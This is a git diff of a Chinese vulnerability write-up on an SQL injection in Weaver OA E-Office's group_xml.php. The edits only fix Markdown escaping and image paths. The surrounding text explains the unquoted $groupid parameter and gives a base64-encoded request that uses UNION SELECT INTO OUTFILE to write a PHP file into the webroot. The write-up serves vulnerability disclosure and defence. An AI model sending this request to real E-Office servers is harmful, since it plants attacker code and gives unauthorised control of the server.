@@ -1,8 +1,8 @@
-# 泛微OA E-Office group_xml.php SQL注入漏洞
+# 泛微OA E-Office group\_xml.php SQL注入漏洞
 
 ## 漏洞描述
 
-泛微OA E-Office group_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限
+泛微OA E-Office group\_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限
 
 ## 漏洞影响
 
@@ -20,7 +20,7 @@ app="泛微-EOffice"
 
 登录页面
 
-![image-20220520140626959](images/202205201406015.png)
+![image-20220520140626959](../.gitbook/assets/202205201406015.png)
 
 存在漏洞的文件为 `inc/group_user_list/group_xml.php`
 
@@ -64,7 +64,7 @@ $row = mysql_fetch_array( $rs );
 $groupmember = $row['GROUP_MEMBER'];
 ```
 
-$groupid没有被双引号包裹，然后造成注入。然后$groupid来自于$pararr['groupid'];其中经过了$explodestpar这个函数
+$groupid没有被双引号包裹，然后造成注入。然后$groupid来自于$pararr\['groupid'];其中经过了$explodestpar这个函数
 
 ```
 function explodeStPar( $enpar )
@@ -113,4 +113,4 @@ function explodeStPar( $enpar )
 /inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd
 ```
 
-![image-20220520140654026](images/202205201406076.png)
+![image-20220520140654026](../.gitbook/assets/202205201406076.png)
